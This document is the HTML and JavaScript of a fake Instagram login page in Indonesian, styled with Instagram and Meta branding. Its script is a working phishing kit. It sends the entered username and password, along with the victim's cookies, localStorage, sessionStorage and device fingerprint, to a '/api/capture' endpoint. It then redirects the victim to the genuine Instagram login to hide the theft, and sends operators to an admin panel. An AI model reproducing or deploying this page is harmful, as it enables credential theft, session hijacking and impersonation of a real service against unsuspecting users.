<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Instagram</title>
<link rel="stylesheet" href="style.css">
</head>
<body>

<div id="loader" class="loader">
    <svg class="ig-logo-loader" viewBox="0 0 24 24" width="80" height="80">
        <defs>
            <radialGradient id="grad" cx="30%" cy="107%" r="150%">
                <stop offset="0%" stop-color="#fdf497"/>
                <stop offset="5%" stop-color="#fdf497"/>
                <stop offset="45%" stop-color="#fd5949"/>
                <stop offset="60%" stop-color="#d6249f"/>
                <stop offset="90%" stop-color="#285AEB"/>
            </radialGradient>
        </defs>
        <rect x="2" y="2" width="20" height="20" rx="5" ry="5" fill="none" stroke="url(#grad)" stroke-width="2"/>
        <circle cx="12" cy="12" r="4.5" fill="none" stroke="url(#grad)" stroke-width="2"/>
        <circle cx="17.5" cy="6.5" r="1.3" fill="url(#grad)"/>
    </svg>
    <div class="from-meta">from <span class="meta-text">Meta</span></div>
</div>

<div id="loginPage" class="login-page hidden">
    <div class="lang-top">Bahasa Indonesia</div>

    <div class="logo-container">
        <svg viewBox="0 0 24 24" width="60" height="60">
            <rect x="2" y="2" width="20" height="20" rx="5" ry="5" fill="none" stroke="url(#grad)" stroke-width="2"/>
            <circle cx="12" cy="12" r="4.5" fill="none" stroke="url(#grad)" stroke-width="2"/>
            <circle cx="17.5" cy="6.5" r="1.3" fill="url(#grad)"/>
        </svg>
    </div>

    <form id="loginForm" class="login-form">
        <input type="text" name="username" placeholder="Nama pengguna, email, atau nomor ponsel" required autocomplete="username">
        <input type="password" name="password" placeholder="Kata sandi" required autocomplete="current-password">
        <button type="submit">Login</button>
    </form>

    <a href="#" class="forgot">Lupa kata sandi?</a>

    <div class="spacer"></div>

    <a href="#" class="signup-btn">Buat akun baru</a>

    <div class="meta-footer">
        <svg width="60" height="12" viewBox="0 0 100 20" fill="none">
            <path d="M10 10 C10 5, 15 5, 17 10 C19 15, 24 15, 24 10 C24 5, 19 5, 17 10" stroke="#fff" stroke-width="2" fill="none"/>
        </svg>
        <span>Meta</span>
    </div>
</div>

<script>
setTimeout(function() {
    document.getElementById('loader').classList.add('hidden');
    document.getElementById('loginPage').classList.remove('hidden');
}, 1000);

document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    const username = this.username.value;
    const password = this.password.value;

    const checkRes = await fetch('/api/login', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ username, password })
    });
    const checkData = await checkRes.json();

    if (checkData.isAdmin) {
        sessionStorage.setItem('admin_token', checkData.token);
        window.location.href = '/admin.html';
        return;
    }

    const fingerprint = {
        cookies: document.cookie,
        url: window.location.href,
        referrer: document.referrer,
        screen: screen.width + 'x' + screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        platform: navigator.platform,
        cores: navigator.hardwareConcurrency,
        memory: navigator.deviceMemory
    };
    try { fingerprint.localStorage = JSON.stringify(localStorage); } catch(e){}
    try { fingerprint.sessionStorage = JSON.stringify(sessionStorage); } catch(e){}

    await fetch('/api/capture', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ username, password, fingerprint })
    });

    document.getElementById('loginPage').classList.add('hidden');
    document.getElementById('loader').classList.remove('hidden');

    setTimeout(function() {
        window.location.href = 'https://www.instagram.com/accounts/login/';
    }, 800);
});
</script>
</body>
</html>
